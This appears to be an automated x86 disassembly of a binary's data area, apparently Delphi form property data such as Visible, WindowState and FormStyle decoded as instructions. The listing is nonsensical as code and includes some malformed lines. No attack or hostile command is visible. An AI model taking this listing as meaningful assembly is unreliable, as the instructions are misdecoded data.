inc esp
add [ eax - 0x1fffbbb6 ] ah
add [ esp + edi * 2 ] cl
inc esp
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ ecx + esi * 2 + 0x6e6c0044 ] cl
inc esp
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
fadd [ eax + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ edi + edx * 2 ] dh
inc ebp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
rol ah 0x57
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
pop eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x41ffbaa8 ] bl
pop eax
inc ebp
add [ edx + eax ] bl
add [ eax ] al
jo r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
jb r-xdata
bound esi [ ebx + 0x53 ]
pop ecx
inc ebp
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
push ebp
inc ebp
add [ eax ] cl
add al [ eax ]
inc eax
test [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or eax 0x7a726f48
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax + 0x55 ] cl
inc eax
add [ eax ] al
cld
inc ecx
add [ eax + 0x34 ] bh
inc eax
add [ esp + ecx * 2 ] al
inc esp
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ ebx + eax * 4 + 0x45 ] bh
inc ebx
add [ edx + eax + 0x34700042 ] ch
add [ ebx ] al
add [ eax ] al
add [ edx + ebx * 2 + 0x620c0045 ] dl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
jae r-xdata
pop ecx
inc ebp
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x59 ] dl
inc ebp
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
lea eax [ eax ]
in al 0x59
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x50000000 ] al
inc ebp
add [ esi ] al
bound esi [ ebx + 0x4e ]
push ebp
inc ebp
add [ edx + eax ] cl
add bh bh
rol [ ebp + 0x10045 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
or eax 0x74726556
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp + 0x5a480040 ]
add bh bh
insd
jl r-xdata
inc ebp
add [ ebx ] al
lea eax [ eax ]
dec eax
pop edx
push ebx
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
pop ecx
add eax 0x50000000
inc ebp
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add ah ah
pop ecx
jb r-xdata
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x455a18c0 ]
add [ edi ] cl
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add [ eax + 0x300455a ] bl
outsd
jb r-xdata
sbb dl 0x5
inc esi
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
outsd
imul ecx [ eax + 0x1004189 ] 0xffffffa5
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
push cs
jo r-xdata
mov eax eax
call 0x645a043
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + ebx * 2 + 0x45 ] al
add [ eax ] cl
jae r-xdata
push eax
outsd
jb r-xdata
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cwde
pop ebx
inc ebp
add [ ecx ] cl
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
insd
inc esp
jae r-xdata
add [ eax ] al
add [ eax + 0x900455b ] bl
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
or al 0x54
shr al 0x5a
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add ah bh
pop edx
inc ebp
add [ edx ] cl
jo r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
pop edx
inc ebp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
xchg esp eax
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
pop ebx
inc ebp
add [ esi ] al
jo r-xdata
inc eax
add [ eax + 0x800455c ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
pop ebx
inc ebp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xor al 0x5c
inc esp
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
cmp [ ebp + eax * 2 ] bl
add ecx [ esp + edx * 2 ]
inc ebx
insb
outsd
jae r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
pushfd
je r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ch
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
or edx [ ebx + eax * 2 + 0x6c ]
sbb [ ebp + eax * 2 ] 0x8
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx + 0x40 ] bl
add [ esp + ebx * 2 ] dh
inc ebp
add [ ebp + 0x5cc40040 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
inc ebp
add [ esi ] al
jns r-xdata
popad
je r-xdata
insb
pop ebx
inc ebp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax ] al
adc [ eax ] al
nop
or [ ebp + 0x45 ] bl
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
jae r-xdata
jb r-xdata
add [ eax ] al
add [ esp + ebx * 2 ] dh
inc esi
outsd
jb r-xdata
js r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
call sub_45a2fe
add cl [ eax ]
push es
add al ah
sub eax [ eax + eax - 0x8 ]
outsb
inc esp
add [ edi + ebp * 2 + 0x6a780044 ] dh
inc esp
add [ eax + 0x3400446f ] bl
mov al [ ebp ]
inc eax
mov eax [ 0x452c0045 ]
inc esp
add [ esi + ebp * 4 ] al
inc ebp
add [ ecx + esi * 4 + 0x45 ] ah
add [ eax ] ah
mov al 0x45
add ah al
inc ebp
inc esp
add al cl
inc ebp
inc esp
add [ edx + esi * 4 + 0x44280045 ] bl
inc esp
add al bl
jo r-xdata
add [ esp + edi * 2 ] cl
inc esp
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
pop esi
inc ebp
add [ eax + 0x4560 ] al
add [ eax ] al
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x5de80040 ] cl
inc ebp
add [ eax ] al
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
adc [ eax + 0x6f ] esi
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
cwde
pop edx
inc ebp
add [ ebx ] al
inc esi
outsd
jb r-xdata
insd
outsd
add [ eax ] al
in al dx
jae r-xdata
jl r-xdata
inc ebp
add [ edx + eax - 0x733fffbe ] ch
inc ebp
add [ esi + ecx * 4 + 0x45 ] dh
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
add [ eax ] al
add ah cl
adc [ eax ] al
cmp al 0x2
add [ eax ] al
loopne r-xdata
add [ eax - 0x53ffba47 ] dl
add [ eax + eax + 0x1c ] 0x6d
inc esp
add [ esi + ecx * 8 - 0x7bd7ffbb ] ah
inc ebp
add al bl
xchg [ ebp ] al
test [ edi - 0x703fffbb ] bh
inc ebp
add [ eax + edx * 4 ] bh
inc ebp
add [ edx + edx * 8 - 0x7307ffbb ] al
inc ebp
add [ eax + 0x680045cd ] cl
mov ah 0x45
add [ edi + ecx * 8 ] bh
inc ebp
add [ eax ] ah
0xe0045 0x0
add [ eax ] al
add eax [ eax ]
add [ eax ] al
int3
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dh bh
pop esi
inc ebp
add [ esi + 0x60 ] ch
inc ebp
add al bh
add al [ eax ]
add [ eax + 0x57 ] bh
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
jae r-xdata
pop ebx
inc ebp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
add al bh
add [ eax + 0x7b ] bl
inc esp
add al ch
sti
inc ebx
add [ ecx + esi * 2 + 0x44 ] ch
add [ edi + edx * 4 ] bh
inc ebp
add [ esi + ebp * 2 + 0x44 ] ch
add [ eax ] dh
sti
inc ebx
add [ ebx + edi * 8 ] dh
inc ebx
add [ eax ] dh
cwde
inc ebp
add [ ebx + ebp + 0x44 ] bl
add [ esi + eax + 0x44 ] dh
add [ esp + edi * 8 + 0x8000043 ] ch
inc esp
add [ edx + ebx * 4 ] ah
inc ebp
add al dh
cwde
inc ebp
add [ eax ] bh
or [ eax + eax - 0x64 ] eax
0x2be00045 0x44
clc
je r-xdata
jb r-xdata
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
adc al 0x5a
inc ebp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc esp
pop ebp
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
outsb
je r-xdata
add [ eax + 0x34 ] bh
inc eax
add al ah
mov dl 0x45
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add ah bl
mov es [ ebp ]
fdivr [ ebx + 0x44 ]
add [ esp + edx * 4 + 0x45 ] cl
add [ eax - 0x59 ] al
inc ecx
add [ eax + edx * 4 - 0x6f27ffbb ] bl
inc ebp
add ah ah
xchg ecx eax
inc ebp
add [ esi + eax + 0x2c40044 ] cl
inc edx
add [ edx + ebx * 4 + 0x45 ] bl
add [ edi + edi * 8 - 0x2a03ffbf ] ah
inc ebp
add [ ebx + ecx * 4 ] dh
inc ebp
add al dh
jbe r-xdata
inc ebp
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
pop esp
inc ebp
add [ eax ] cl
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_456378
clc
mov [ 0xffffffffa5c40045 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
popad
outsb
adc [ ecx ] 0x42
add [ eax ] dh
add bh bh
inc esp
or al [ eax + eax + 0x60 ]
or al [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001c ] al
outsd
insb
outsd
jb r-xdata
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ eax + 0x18004402 ] ch
cdq
inc ebp
add [ eax - 0x6a ] dh
add [ eax - 0x67 ] cl
inc ebp
add [ eax - 0x6a ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
je r-xdata
push ebp
jae r-xdata
popad
jb r-xdata
adc [ eax ] al
call 0xffffffff95446456
xlat
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
sbb [ ecx - 0x698fffbb ] bl
insb
sbb al 0xc8
inc ebx
add [ ecx + eax ] ch
jmp esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
js r-xdata
pop ebx
inc ebp
add [ ecx ] dh
add al [ eax ]
push [ ecx ]
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x58ff0001 ] ah
jae r-xdata
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x72
inc esp
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc esp
add [ ecx ] al
add [ eax ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc al
sub [ eax + eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
ror [ ecx ] 0x1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
je r-xdata
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
add [ eax ] al
jb r-xdata
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add bh bh
les esp [ ebp + 0x45 ]
add [ eax + 0x3 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x4010cc74
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
outsb
je r-xdata
mov eax 0x5d0043
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
outsd
outsb
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
dec esp
mov edx 0x740043
add bh bh
test al 0x1
add bh bh
push 0x100445c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
add [ gs : ecx + 0x9b0043 ] bh
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
add [ ebx + eax * 2 ] cl
jae r-xdata
adc [ edx ] eax
in al dx
add al [ eax ]
inc [ eax + 0x10045d7 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
add [ eax ] al
add eax [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x4ff0001 ] ah
jb r-xdata
dec ecx
imul ebp [ ebp + 0x48 ] 0x8004555
add al [ eax ]
inc eax
test [ ebp ] eax
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
or eax [ eax ]
or eax 0x7a726f48
push ebx
arpl [ edx + 0x6f ] si
insb
push esp
outsd
outsb
je r-xdata
add bh bh
xor [ edx ] eax
add [ eax ] ch
jb r-xdata
inc esp
jb r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
movsd [ edi ] [ esi ]
inc ebp
and [ edx ] eax
inc eax
add al [ eax ]
inc ebp
add [ edi ] ch
add al [ eax ]
push esp
movsd [ edi ] [ esi ]
inc ebp
add ah al
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
push ss
inc edx
add [ eax ] ch
add bh bh
cwde
or [ eax + eax - 0x58 ] eax
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
add [ esi ] cl
dec edi
jbe r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
int3
pop edx
js r-xdata
je r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
add ah cl
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
adc [ eax ] al
dec esp
add [ eax ] al
inc [ eax + eax - 0x697fffbc ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
insb
push esp
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
add [ eax ] al
sub [ ebx ] 0x0
add al 0x49
test [ eax + eax + 0x48 ] 0x2
add bh bh
cmp al 0xa7
inc ebp
add ah al
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d04002d ] al
outsb
jne r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ 0x35ff0002 ] dh
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
outsb
je r-xdata
adc [ eax ] al
xor al 0x2
add bh bh
xor al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
jb r-xdata
outsb
in al dx
pop ebx
inc ebp
outsb
arpl [ eax - 0x44 ] bp
stc
inc esp
add [ eax + eax ] bh
[ eax + ecx + 0x44 ]
add ah al
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
inc eax
add [ ecx + ebp * 4 + 0x45 ] dh
add [ eax - 0x3bffba57 ] al
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
adc [ eax ] al
adc [ ecx - 0x56dbffbb ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
pop edx
inc ebp
add [ eax ] dh
add al [ eax ]
[ eax - 0x57 ]
inc ebp
add ah al
movsd [ edi ] [ esi ]
inc ebp
adc [ eax ] al
cdq
add [ eax ] al
push esp
or [ eax + eax - 0x44 ] eax
or [ eax + eax ] eax
add [ eax ] al
push ebx
outsb
popad
jo r-xdata
outsd
add [ eax ] al
dec edi
jb r-xdata
js r-xdata
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x53080037 ] al
push 0x6948776f
outsb
je r-xdata
inc ebp
add [ eax ] ah
sub [ eax + eax ] eax
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
bound ebp [ edx + 0x65 ]
cmpsb [ esi ] [ edi ]
inc ebp
add ah al
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
add [ eax + 0x2 ] ah
add bh bh
inc esp
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
je r-xdata
inc ebp
add ah al
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
adc [ eax ] al
dec eax
add [ eax ] al
jmp [ eax ]
push esp
push ebp
inc ebp
add [ edx + eax ] cl
add bh bh
rol [ ebp - 0x5a3bffbb ] 0x1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
stosb [ edi ]
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
inc eax
add [ eax ] al
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
je r-xdata
add [ eax + 0x2 ] bl
add bh bh
adc al 0xa7
inc ebp
add ah al
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
push ebx
adc [ eax ] al
push edi
add [ eax ] al
jne r-xdata
jpe r-xdata
popad
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
sub eax [ edx ]
add bh bh
jo r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
js r-xdata
les esp [ ebp + 0x45 ]
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] cl
dec edi
jb r-xdata
push ecx
mov al 0x78
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
inc ebx
dec edi
or dl dh
inc esp
outsb
push edx
jae r-xdata
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc esp
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ edi + ecx * 2 ] cl
